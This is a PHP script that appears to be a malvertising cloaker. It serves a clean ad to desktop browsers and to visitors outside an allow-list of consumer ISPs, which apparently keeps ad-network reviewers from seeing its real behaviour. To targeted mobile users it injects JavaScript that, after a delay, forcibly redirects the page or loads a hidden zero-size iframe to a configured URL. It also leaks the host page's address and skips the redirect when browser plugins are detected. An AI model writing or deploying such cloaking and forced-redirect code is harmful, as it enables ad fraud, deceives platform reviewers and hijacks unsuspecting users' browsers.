<?php

	//
	// Script usage: http(s)://host/dir/ad.php?<id>
	//
	//
	// This script spits out a clean HTML ad if it detects it's either been accessed by
	// a) A non mobile browser (user agent)
	// b) The IP address is not in the allowed ISP list or blocked due to any blocked lists
	//
	// In all other cases it returns a HTML page with an body onload event, and javascript functiont that redirects to the redirect Url. The scripts basically replaces 2 tags in the
	// clean html: {script}, and {onload}. These tags should be placed in the <head>{script}</head>, and <body{onload}></body> of the clean Html.
	//
	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
	//

	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
												 "T-Mobile USA",
												 "Sprint PCS",
												 "Verizon Wireless",
												 "Comcast Cable",
												 "Time Warner Cable",
												 "AT&T U-verse",
												 "Charter Communications",
												 "Cox Communications",
												 "CenturyLink",
												 "Optimum Online",
												 "AT&T Internet Services",
												 "Frontier Communications",
												 "Suddenlink Communications",
												 "XO Communications",
												 "Verizon Internet Services",
												 "Mediacom Cable",
												 "Windstream Communications",
												 "Bright House Networks",
												 "Abovenet Communications",
												 "Google",
												 "Cable One", "VECTANT"),
								   "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","CablevisiÃ³n, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar MÃ©xico","RadioMovil Dipsa, S.A. de C.V."),	//MX												 
								   "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),	//FR									
								   "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),	//UK									
								   "AU" => array("Optus","Telstra Internet","Vodafone Australia","TPG Internet","iiNet Limited","Dodo Australia"),		//AU									
								   "JP" => array("Kddi Corporation","Softbank BB Corp","NTT","Open Computer Network","NTT Docomo,INC.","K-Opticom Corporation","@Home Network Japan","So-net Entertainment Corporation","Biglobe","Jupiter Telecommunications Co.","TOKAI","VECTANT"),		//JP									
								   "KR" => array("SK Telecom","Korea Telecom","SK Broadband","POWERCOM","Powercomm","LG Powercomm","LG DACOM Corporation","Pubnetplus","LG Telecom"),		//KR									
								   "BR" => array("Virtua","Vivo","NET Virtua","Global Village Telecom","Oi Velox","Oi Internet","Tim Celular S.A.","Embratel","CTBC","Acom Comunicacoes S.A."),	//BR									
								   "IN" => array("Airtel","Bharti Airtel Limited","Idea Cellular","Vodafone India","BSNL","Reliance Jio INFOCOMM","Airtel Broadband","Beam Telecom","Tata Mobile","Aircel","Reliance Communications","Hathway","Bharti Broadband")		//IN	
	);

	$blacklistedCities 		= array();
	$blacklistedProvinces 	= array();
	$blacklistedSubDivs1 	= array();
	$blacklistedSubDivs2 	= array(); 
	$blacklistedCountries 	= array();
	$blacklistedContinents 	= array();

	$sourceWeightListPerCountry = array("US" => array("xhamster" => 8, "google" => 1, "pornhub" => 1),
								  		"MX" => array("xhamster" => 8, "google" => 1, "pornhub" => 1),
								  	   );

	/* 
		Get ISP by IP info 
		$ip: ipv4 to query information for
		
		returns an array with information or FALSE
	**/
	function getISPInfo($ip)
	{
		mylog('getISPInfo:'.$ip);
		
		// If data not available, we can´t do it
		if (!file_exists('ispipinfo.db')) {
			mylog('getISPInfo: missing DB');
			return false;
		}
		
		/* Use a lock to prevent parallel updates */
		$fl = fopen('ispip.lock', 'c+b');
		if (is_resource($fl)) {
			if (!flock($fl, LOCK_SH /* Lock for reading */ )) { 
				fclose($fl);
				$fl = false;
			}
		}

		$ip = ip2long($ip);
		
		/*
		4 1 1 2 2 2 2 = 14 bytes
		|ip|ip|ip|ip|mk|io|isp|isp|org|org|asn#|asn#|asnn|asnn
		
		mk = mask
		isp = ISP code
		org = Organization code
		asn# = Autonomous System number
		asnn = Autonomous System number name
		*/
			
		$last = filesize('ispipinfo.db') / 14; /* 14 bytes per record */
		$f = fopen('ispipinfo.db','rb');
		
		$lo = 0; 
		$hi = $last - 1;
		while ($lo <= $hi) {
			/* Get index */
			$mid = (int)(($hi - $lo) / 2) + $lo;
			
			/* Read record and unpack it */
			fseek($f, $mid * 14);
			$r = fread($f, 14);
			
			/* 'VCCvvvv' */
			$cols = unpack('V1a/C1b/C1c/v1d/v1e/v1f/v1g',$r);
			mylog('[#'.$mid.']: ip:'.long2ip((float)$ip).' => ip:'.long2ip((float)$cols['a']).'/'.$cols['b']);
					
			/* Compare the ip with the supplied one */
			$cmp = (int)($ip-0x80000000) - (int)($cols['a']-0x80000000); /* fix for missing u32 type in php */

			/* Jump to the next register */
			if ($cmp > 0) {
				$lo = $mid + 1;
			} elseif ($cmp < 0) {
				$hi = $mid - 1;
			} else {
				$lo = $mid + 1;
				break;
			}
		}
		
		/* Point to the proper entry */
		if ($lo > 0) {
			--$lo;
		}
		
		/* Lets do some parsing - Read record and unpack it */
		fseek($f, $lo * 14);
		$r = fread($f, 14);
		fclose($f);
		$cols = unpack('V1a/C1b/C1c/v1d/v1e/v1f/v1g',$r);
		mylog('[#'.$lo.']: ip:'.long2ip((float)$ip).' => ip:'.long2ip((float)$cols['a']).'/'.$cols['b']);
		$mask = ~((1 << (32-$cols["b"]))-1);
		
		if (((int)(($ip ^ $cols["a"]) & $mask)) == 0) {
			/* Match! - Return information! */
			
			$isp_code = $cols['d'] | (($cols['c'] & 0x0F) << 16);
			$org_code = $cols['e'] | (($cols['c'] & 0xF0) << 12);
			$asn_nr_code = $cols['f'];
			$asn_name_code = $cols['g'];
			
			/* Find the ISP information */
			$f = fopen('isps.db','rb');
			fseek($f, $isp_code * 54);
			$isp_name = trim(fread($f, 54));
			fclose($f);
			
			/* Find the Organization information */
			$f = fopen('organizations.db','rb');
			fseek($f, $org_code * 54);
			$org_name = trim(fread($f, 54));
			fclose($f);

			/* Find the ASN nr information */
			$f = fopen('asnnrs.db','rb');
			fseek($f, $asn_nr_code * 3);
			$r = fread($f, 3);
			$cols = unpack('v1a/C1b',$r);
			$asn_nr = $cols['a'] | ($cols['b'] << 16);
			fclose($f);

			/* Find the ASN name information */
			$f = fopen('asnnames.db','rb');
			fseek($f, $asn_name_code * 93);
			$asn_name = trim(fread($f, 93));
			fclose($f);

			/* Release lock. Next CURL operation will be carried */
			if ($fl !== false) {
				flock($fl, LOCK_UN);
				fclose($fl);
			}	
			
			/* Return all available information */
			return array(
					'isp' => $isp_name,
					'organization' => $org_name,
					'asn_nr' => $asn_nr,
					'asn_name' => $asn_name
				  );
		}
		
		/* Release lock. Next CURL operation will be carried */
		if ($fl !== false) {
			flock($fl, LOCK_UN);
			fclose($fl);
		}	
		
		// No information found
		return false;
	}	

	function lookup_subdiv($continent_nr,$country_nr=0,$subdiv1_code="",$subdiv2_code="")
	{		
		$last = filesize('subdivisions.db') / 80; /* 80 bytes per record */
		$f = fopen('subdivisions.db','rb');
		
		$lo = 0; 
		$hi = $last - 1;
		while ($lo <= $hi) {
			/* Get index */
			$mid = (int)(($hi - $lo) / 2) + $lo;
			
			/* Read record and unpack it */
			fseek($f, $mid * 80);
			$r = fread($f, 80);
			$cols = unpack('C1a/C1b/a3c/a3d/a72e',$r);
			$cols['c'] = trim($cols['c']);
			$cols['d'] = trim($cols['d']);
			$cols['e'] = trim($cols['e']);
			
			/* Compare with the record we are looking for */
			$cmp = $continent_nr - $cols['a'];
			if ($cmp == 0) {
				$cmp = $country_nr - $cols['b'];
				if ($cmp == 0) {
					$cmp = strcmp($subdiv1_code, $cols['c']);
					if ($cmp == 0) {
						$cmp = strcmp($subdiv2_code, $cols['d']);
					}
				}
				
			}

			/* Jump to the next register */
			if ($cmp > 0) {
				$lo = $mid + 1;
			} elseif ($cmp < 0) {
				$hi = $mid - 1;
			} else {
				$lo = $mid + 1;
				break;
			}
		}
		
		/* Point to the proper entry */
		if ($lo > 0) {
			--$lo;
		}
		
		/* Lets do some parsing - Read record and unpack it */
		fseek($f, $lo * 80);
		$r = fread($f, 80);
		fclose($f);
		$cols = unpack('C1a/C1b/a3c/a3d/a72e',$r);
		$cols['c'] = trim($cols['c']);
		$cols['d'] = trim($cols['d']);
		$cols['e'] = trim($cols['e']);

		/* Compare with the record we are looking for */
		$cmp = $continent_nr - $cols['a'];
		if ($cmp == 0) {
			$cmp = $country_nr - $cols['b'];
			if ($cmp == 0) {
				$cmp = strcmp($subdiv1_code, $cols['c']);
				if ($cmp == 0) {
					$cmp = strcmp($subdiv2_code, $cols['d']);
				}
			}
		}

		return ($cmp == 0) ? trim($cols['e']) : '';
	}

	/* 
		Get ip info 
		$ip: ipv4 to query information for
		
		returns an array with information
	**/
	function getGEOInfo($ip)
	{
		mylog('getGEOInfo:'.$ip);

		// If data not available, fail call
		if (!file_exists('ipinfo.db')) {
			mylog('getGEOInfo: missing DB');
			return false;
		}
		
		/* Use a lock to prevent parallel updates */
		$fl = fopen('geoip.lock', 'c+b');
		if (is_resource($fl)) {
			if (!flock($fl, LOCK_SH /* Lock for reading */ )) { 
				fclose($fl);
				$fl = false;
			}
		}

		$ip = ip2long($ip);
		/*
		|ip|ip|ip|ip|mk|cc|cc|cc|pc*8|lt|lt|lt|lt|ln|ln|ln|ln
		*/
		
			
		$last = filesize('ipinfo.db') / 24; /* 24 bytes per record */
		$f = fopen('ipinfo.db','rb');
		
		$lo = 0; 
		$hi = $last - 1;
		while ($lo <= $hi) {
			/* Get index */
			$mid = (int)(($hi - $lo) / 2) + $lo;
			
			/* Read record and unpack it */
			fseek($f, $mid * 24);
			$r = fread($f, 24);
			$cols = unpack('V1a/C1b/v1c/C1d/a8e/f1f/f1g',$r);
			
			mylog('[#'.$mid.']: ip:'.long2ip((float)$ip).' => ip:'.long2ip((float)$cols['a']).'/'.$cols['b']);

			
			/* Compare the ip with the supplied one */
			$cmp = (int)($ip-0x80000000) - (int)($cols['a']-0x80000000); /* fix for missing u32 type in php */

			/* Jump to the next register */
			if ($cmp > 0) {
				$lo = $mid + 1;
			} elseif ($cmp < 0) {
				$hi = $mid - 1;
			} else {
				$lo = $mid + 1;
				break;
			}
		}
		
		/* Point to the proper entry */
		if ($lo > 0) {
			--$lo;
		}
		
		/* Lets do some parsing - Read record and unpack it */
		fseek($f, $lo * 24);
		$r = fread($f, 24);
		fclose($f);
		$cols = unpack("V1a/C1b/v1c/C1d/a8e/f1f/f1g",$r);
		
		mylog('[#'.$lo.']: ip:'.long2ip((float)$ip).' => ip:'.long2ip((float)$cols['a']).'/'.$cols['b']);
		
		$mask = ~((1 << (32-$cols["b"]))-1);
		
		if (((int)(($ip ^ $cols["a"]) & $mask)) == 0) {
			/* Match! - Return information! */
			$city_code = $cols['c'] | ($cols['d'] << 16);
			$zip = trim($cols['e']);
			$lat = $cols['f'];
			$lon = $cols['g'];
			
			/* Find the cityinfo information and unpack it */
			$f = fopen('cities.db','rb');
			fseek($f, $city_code * 54);
			$r = fread($f, 54);
			fclose($f);
			$cols = unpack('v1a/C1b/v1c/a49d',$r);
			
			$subdivision_code = $cols['a'] | ($cols['b'] << 16);
			$timezone_code = $cols['c'];
			$city = trim($cols['d']);
			
			/* Find the timezone information */
			$timezones_bynr = unserialize(file_get_contents('timezones.db'));
			$timezone = $timezones_bynr[$timezone_code];
			
			/* Find the subdivision associated to the record */
			$f = fopen('subdivisions.db','rb');
			fseek($f, $subdivision_code * 80);
			$r = fread($f, 80);
			fclose($f);
			$cols = unpack('C1a/C1b/a3c/a3d/a72e',$r); /* ct|cy|s1*3|s2*3|divname72 */
			$continent_nr = $cols['a'];
			$country_nr = $cols['b'];
			$subdiv1_code = trim($cols['c']);
			$subdiv2_code = trim($cols['d']);
			$province = trim($cols['e']);
			
			/* Find the continent information */
			$continents_bynr = unserialize(file_get_contents('continents.db'));
			$continent_code = $continents_bynr[$continent_nr][0];
			$continent_name = $continents_bynr[$continent_nr][1];

			/* Find the country information */
			$countries_bynr = unserialize(file_get_contents('countries.db'));
			$country_code = $countries_bynr[$country_nr][0];
			$country_name = $countries_bynr[$country_nr][1];
			
			$subdiv1   = lookup_subdiv($continent_nr,$country_nr,$subdiv1_code);
			$subdiv2   = lookup_subdiv($continent_nr,$country_nr,$subdiv1_code,$subdiv2_code);
			
			/* Release lock. Next CURL operation will be carried */
			if ($fl !== false) {
				flock($fl, LOCK_UN);
				fclose($fl);
			}	
			
			/* Return all available information */
			return array(
					'zip' => $zip,
					'lat' => $lat,
					'lon' => $lon,
					'city' => $city,
					'timezone' => $timezone,
					'province' => $province,
					'continent_code' => $continent_code,
					'country_code' => $country_code,
					'continent' => $continent_name,
					'country' => $country_name,
					'subdiv1_code' => $subdiv1_code,
					'subdiv2_code' => $subdiv2_code,
					'subdiv1' => $subdiv1,
					'subdiv2' => $subdiv2
				  );
		}
		
		/* Release lock. Next CURL operation will be carried */
		if ($fl !== false) {
			flock($fl, LOCK_UN);
			fclose($fl);
		}	
		
		// No information found
		return false;
	}	

	/*
		Get the Client IP 
	 **/
	function getClientIP()
	{
	    $ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

	    foreach ($ip_keys as $key) {
	        if (array_key_exists($key, $_SERVER) === true) {
	            foreach (explode(',', $_SERVER[$key]) as $ip) {
	                // trim for safety measures
	                $ip = trim($ip);
	                // attempt to validate IP
	                if (validate_ip($ip)) {
	                    return $ip;
	                }
	            }
	        }
	    }

	    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
	}

	/**
	 * Ensures an ip address is both a valid IP and does not fall within
	 * a private network range.
	 */
	function validate_ip($ip)
	{
	    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false)
	    {
	        return false;
	    }

	    return true;
	}

	function trimNewLine($string)
	{
		return str_replace(PHP_EOL, '', $string);
	}

	function processConfig($filename)
	{
		$result = array();

		$f = fopen($filename, "r");

	    while (($line = fgets($f)) !== false)
	    {
	        $colonIndex = strpos($line, ":");

	        if ($colonIndex !== false)
	        {
		    	$key = trim(substr($line, 0, $colonIndex));
		    	$value = trim(trimNewLine(substr($line, $colonIndex + 1)));

		    	$result[$key] = $value;
		    }
	    }

	    fclose($f);

	    return $result;
	}

	function appendReferrerParameter($url)
	{
		if (strpos($url, "?") === false)
		{
			$url .= "?";
		}
		else
		{
			$url .= "&";
		}

		$url .= "referrer=";

		return $url;
	}

	function detectMobileOS()
	{
		 $osArray = array(
	                        '/iphone/i'             =>  'iOS',
	                        '/ipod/i'               =>  'iOS',
	                        '/ipad/i'               =>  'iOS',
	                        '/android/i'            =>  'Android',
		                 );

	    foreach ($osArray as $regex => $value)
	    { 
	        if (preg_match($regex, $user_agent))
	        {
	            return $value;
	        }
	    }

	    return null;
	}

	function weightedRand($sourceWeightList)
	{
	    $pos = mt_rand(1, array_sum(array_values($sourceWeightList)));           
	    $sum = 0;

	    foreach ($sourceWeightList as $source => $weight)
	    {
	        $sum += $weight;

	        if ($sum >= $pos)
	        {
	            return $source;
	        }
	    }

	    return null;
	}	

	function generateAutoRotateSourceParameter($sourceWeightList)
	{
		$result = "f_source=";

		$result .= weightedRand($sourceWeightList);

		return $result;
	}

	function appendAutoRotateSourceParameter($url, $sourceWeightList)
	{
		return $url . "&" . generateAutoRotateSourceParameter($sourceWeightList);
	}

	function mylog($txt) {
		/*
		$f = fopen("ispiplog.log","a");
		fwrite($f,$txt."\n");
		fclose($f);
		*/
	}

	/*
	 * Log to the geoip.log
	 */
	function geoisplog($txt) {
		if (file_exists('geoisplog.log')) {
			$f = fopen("geoisplog.log","a");
			fwrite($f,$txt."\n");
			fclose($f);
		}
	}

	function adlog($txt) {
		if (file_exists('adlog.log')) {
			$f = fopen("adlog.log","a");
			fwrite($f,date("m.d.y H:i:s") . ': ' . $_SERVER['REMOTE_ADDR'] . "(" . $_SERVER['HTTP_USER_AGENT'] . "): " . $txt . " \n");
			fclose($f);
		}		
	}

	$queryString = $_SERVER['QUERY_STRING'];
	$ampIndex = strpos($queryString, "&");

	if ($ampIndex !== false)
	{
		$campaignID = substr($queryString, 0, $ampIndex);
	}
	else
	{
		$campaignID = $queryString;
	}

	$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
	$configFilename  = "ads/" . $campaignID . ".config.txt";

	if (!file_exists($cleanHtmlFilename) || !file_exists($configFilename))
	{
		exit;
	}

	$resultHtml = file_get_contents($cleanHtmlFilename);

	$adConfig = processConfig($configFilename);

	$redirectUrl = array_key_exists('RedirectUrl', $adConfig) ? $adConfig['RedirectUrl'] : "";
	$redirectMethod = array_key_exists('Method', $adConfig) ? $adConfig['Method'] : "";
	$adCountry = array_key_exists('CountryCode', $adConfig) ? $adConfig['CountryCode'] : "";

	if (empty($redirectUrl))
	{
		exit;
	}

	if (empty($adCountry))
	{
		$adCountry = "US";
	}

	$sourceWeightList = array();

	if (array_key_exists($adCountry, $sourceWeightListPerCountry))
	{
		$sourceWeightList = $sourceWeightListPerCountry[$adCountry];
	}

	// Append referrer
	$redirectUrl = appendReferrerParameter($redirectUrl);
	// Append auto generated source parameter
	//$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);

	$serveCleanAd = false;

	if (!preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
	{
		$serveCleanAd = true;

		adlog("UserAgent is not a mobile device.");
	}
	else
	{
		$ip  = getClientIP();
		$geo = getGEOInfo($ip);
		$isp = getISPInfo($ip);

		geoisplog(
			'ip:"'.$ip.'",'.
			'isp:"'.$isp['isp'].'",'.
			'city:"'.$geo['city'].'",'.
			'province:"'.$geo['province'].'",'.
			'country:"'.$geo['country'].'",'.
			'country_code:"'.$geo['country_code'].'",'.
			'continent:"'.$geo['continent'].'",'.
			'continent_code:"'.$geo['continent_code'].'",'.
			'subdiv1:"'.$geo['subdiv1'].'",'.
			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
			'subdiv2:"'.$geo['subdiv2'].'",'.
			'subdiv2_code:"'.$geo['subdiv2_code'].'"');

		$allowedIsps = array();

		if (array_key_exists($adCountry, $allowedIspsPerCountry))
		{
			$allowedIsps = $allowedIspsPerCountry[$adCountry];
		}

		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
			!in_array($geo['city'], $blacklistedCities) &&
			!in_array($geo['province'], $blacklistedProvinces) &&
			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
			!in_array($geo['country'], $blacklistedCountries) &&
			!in_array($geo['continent'], $blacklistedContinents))
		{
			$serveCleanAd - false;

			adlog("ISP/Geo is in allowed list(s) and in none of the blacklists. ISP: " . $isp['isp']);
		}
		else
		{
			$serveCleanAd = true;

			adlog("ISP/Geo is either not in allowed list, or in one or more blacklists. ISP: " . $isp['isp']);
		}
	}

	if ($serveCleanAd)
	{
		$resultHtml = str_replace("{script}", "", $resultHtml);
		//$resultHtml = str_replace("{onload}", " onload=\"alert('Server side: Not allowed to view redirect script.');alert('isp:$isp[isp], ip:$ip');\"", $resultHtml);
		$resultHtml = str_replace("{onload}", "", $resultHtml);
	}
	else
	{
		if ($redirectMethod == "windowlocation")
		{
			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
		}
		else if ($redirectMethod == "windowtoplocation")
		{
			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
		}
		else if ($redirectMethod == "1x1iframe")
		{
			$redirectCode = "var el = document.createElement('iframe');
							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
							 el.width = 1;
							 el.height = 1;
							 el.border = 'none';
							 document.body.appendChild(el);";
		}
		else // Default 0x0 iframe redirect
		{
			$redirectCode = "var el = document.createElement('iframe');
							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
							 el.width = 0;
							 el.height = 0;
							 el.border = 'none';
							 document.body.appendChild(el);";
		}

		$scriptCode = "<script type=\"text/javascript\">

							function inIframe ()
							{
							    try
							    {
							        return window.self !== window.top;
							    }
							    catch (e)
							    {
							        return true;
							    }
							}

						   function go()
						   {
						   		if (inIframe())
						   		{
						   			if (navigator.plugins.length > 0)
						   			{
						   				return;
						   			}

						   			if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))
									{
										setTimeout(function()
										{
											var topDomain = '';

											try
											{
												topDomain = window.top.location.href;
											}
											catch(e) { }

											if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
											{
												topDomain = document.referrer;
											}

											$redirectCode
										}, 3000);
									}
									else
									{
										if (typeof jslog === 'function')
										{
    										jslog('Touch test failed.');
										}
									}
						   		}
						   	}
					   </script>";		

		$onloadCode = " onload=\"go();\"";

		$resultHtml = str_replace("{script}", $scriptCode, $resultHtml);
		$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
	}

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	echo $resultHtml;

?>